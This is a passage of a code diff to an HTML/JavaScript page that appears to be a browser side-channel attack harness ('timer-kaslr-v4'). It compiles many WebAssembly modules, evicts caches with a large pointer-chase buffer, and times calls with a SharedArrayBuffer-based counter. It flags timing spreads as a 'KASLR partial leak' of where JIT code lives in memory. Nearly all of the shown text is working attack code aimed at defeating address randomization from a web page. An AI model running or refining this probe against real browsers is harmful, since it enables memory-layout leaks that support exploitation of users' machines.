+      const inst = await WebAssembly.instantiate(makeWasm(i, i*7));
+      fns.push({ fn: inst.instance.exports.call, id: i });
+    } catch(e) {}
+  }
+  log(`[*] T5 compiled ${fns.length} modules`);
+
+  // Warmup
+  for (const {fn} of fns) { let x=0; for(let i=0;i<200;i++) x+=fn(i); }
+
+  const ROUNDS = 10;
+  const BATCH  = 64;
+
+  // Build large eviction set (touches all cache levels)
+  const evict = buildPointerChase(32 * 1024 * 1024);
+  let eidx=0;
+  for(let i=0;i<evict.entries;i++) eidx=evict.arr[eidx*evict.stride];
+
+  // Per-module: accumulate cold and hot times over ROUNDS rounds
+  const coldAccum = new Array(N).fill(0);
+  const hotAccum  = new Array(N).fill(0);
+  const coldCount = new Array(N).fill(0);
+
+  for (let round = 0; round < ROUNDS; round++) {
+    // Full eviction
+    let eidx2=0;
+    for(let i=0;i<evict.entries;i++) eidx2=evict.arr[eidx2*evict.stride];
+    evict.arr[0]^=eidx2&0;
+
+    // Cold timing (post-eviction)
+    for (const {fn, id} of fns) {
+      const t0 = rdcnt();
+      let x=0; for(let i=0;i<BATCH;i++) x+=fn(3);
+      const dt = (rdcnt()-t0+(x&0)) / BATCH;
+      coldAccum[id] += dt;
+      coldCount[id]++;
+    }
+
+    // Hot timing (in icache now)
+    for (const {fn, id} of fns) {
+      const t0 = rdcnt();
+      let x=0; for(let i=0;i<BATCH;i++) x+=fn(3);
+      hotAccum[id] += (rdcnt()-t0+(x&0)) / BATCH;
+    }
+  }
+
+  // Average cold/hot per module
+  const results = fns.map(({id}) => ({
+    id,
+    cold: coldAccum[id] / coldCount[id] * NS_PER_UNIT,
+    hot:  hotAccum[id]  / coldCount[id] * NS_PER_UNIT,
+  }));
+
+  results.forEach(r =>
+    log(`[*] T5 module ${r.id}: cold=${r.cold.toFixed(1)}ns hot=${r.hot.toFixed(1)}ns delta=${(r.cold-r.hot).toFixed(1)}ns`)
+  );
+
+  const coldNs   = results.map(r=>r.cold);
+  const coldMin  = Math.min(...coldNs);
+  const coldMax  = Math.max(...coldNs);
+  const coldSpread = coldMax / Math.max(coldMin, 0.1);
+
+  log(`[*] T5 cold timing spread: min=${coldMin.toFixed(1)}ns max=${coldMax.toFixed(1)}ns ratio=${coldSpread.toFixed(2)}x`);
+
+  if (coldSpread >= 2 && coldMax > 10) {
+    log(`[!!!] T5 JIT ADDRESS VARIANCE: ${coldSpread.toFixed(1)}x spread in cold-call timing across modules`);
+    log(`[!!!] T5 → different JIT code pages have different cache residency after eviction`);
+    log(`[!!!] T5 → timing identifies which cache set/row the JIT code lives in → KASLR partial leak`);
+  }
+
+  // Rank modules by cold time — slowest = least cache-resident = different memory region
+  results.sort((a,b)=>b.cold-a.cold);
+  log(`[*] T5 modules ranked by cold time: ${results.map(r=>`m${r.id}=${r.cold.toFixed(0)}ns`).join(' ')}`);
 }
 
 // ─────────────────────────────────────────────────────────────
 // MAIN
 // ─────────────────────────────────────────────────────────────
 (async () => {
-  log('// timer-kaslr-v3 ready');
+  log('// timer-kaslr-v4 ready');
   log(`${new Date().toISOString().substr(11,12)} === STARTING ===`);
   if (!self.SharedArrayBuffer) { log('[!] SAB unavailable'); return; }
 
@@ -486,21 +436,18 @@ async function t6() {
   const t2res = await t2();
   await new Promise(r=>setTimeout(r,50));
 
-  await t3(t2res.hasSignal);
+  await t3(t2res.hasDRAM);
   await new Promise(r=>setTimeout(r,50));
 
   await t4();
   await new Promise(r=>setTimeout(r,50));
 
   await t5();
-  await new Promise(r=>setTimeout(r,50));
-
-  await t6();
 
   counterWorker.terminate();
 
   const hits = LOG.textContent.split('\n').filter(l=>l.includes('[!!!]'));
-  log(`\n=== DONE — [!!!] hits: ${hits.length} ===`);
+  log(`\n=== DONE — [!!!]: ${hits.length} ===`);
   hits.forEach(h=>log(h));
 })();
 </script>
